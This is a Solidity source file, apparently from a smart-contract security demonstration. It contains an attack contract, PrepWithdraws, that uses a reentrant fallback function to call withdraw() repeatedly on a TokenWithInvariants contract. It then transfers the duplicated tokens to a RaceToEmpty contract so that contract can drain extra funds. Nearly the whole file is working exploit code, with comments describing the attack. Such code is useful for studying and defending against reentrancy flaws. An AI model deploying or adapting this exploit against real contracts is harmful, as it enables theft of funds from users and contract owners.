/* The proxy contract is required to declare an interface
   that PrepWithdraws understands */
contract TWIProxy {
  event Log(string msg ,address from, address to, uint value);
  mapping(address => uint) public balanceOf;
  uint public totalSupply;

  function transfer(address to, uint value) {
  }

  function deposit(uint amount) {
  }

  function withdraw() {
  }

}


/*
 * This contract is used to modify an instance of the TokenWithInvariants
 * contract in such a way that another contract, RaceToEmpty, can
 * withdraw multiple times.
 *
 * numTokens is the number of tokens you wish to replicate
 * numExtraWithDraws is the number of extra times you wish to withdraw it
 * from the RaceToEmpty contract
 */
contract PrepWithdraws {
  event AttackLog(string msg, uint value);
  /* It's important that performAttack is initially false so
   * that we can give ether to this contract to deposit into
   * TokenWithInvariants contract without invoking logic of
   * the default function
   */
  bool performAttack = false;
  uint8 depth = 0;
  uint constant conversion = 1 szabo;
  uint numExtraWithdraws = 1;
  /* Fill in with address of TokenWithInvariants contract */
  TWIProxy twi;
  address raceToEmptyAddress;
  uint8 numTokens;
  uint tokensInWei;

  /* Constructor */
  function PrepWithdraws(address _twiAddress, address _raceToEmptyAddress,
                         uint8 _numTokens, uint _numExtraWithdraws) {
    twi = TWIProxy(_twiAddress);
    raceToEmptyAddress = _raceToEmptyAddress;
    numTokens    = _numTokens;
    numExtraWithdraws   = _numExtraWithdraws;
    tokensInWei  = numTokens * conversion;
  }

  /* Default function. Always run */
  function() {
    if (performAttack) {
      depth = depth + 1;
      AttackLog("value", (uint)(this.balance/conversion));
      if (depth < numExtraWithdraws) {  /* attack again */
        twi.withdraw();
      } else {
        AttackLog("Transferring tokens", 99);
        twi.transfer.value(numExtraWithdraws*tokensInWei)(raceToEmptyAddress,numTokens);
        performAttack = false; /* turn off attack again*/
      }
    }
  }

  function reset() {
    performAttack = false;
  }

  function start() {
    depth = 0;
    performAttack = true;
    /* Contract itself must have some funds to make deposit*/
    twi.deposit.value(tokensInWei)(numTokens);
    twi.withdraw();
  }

}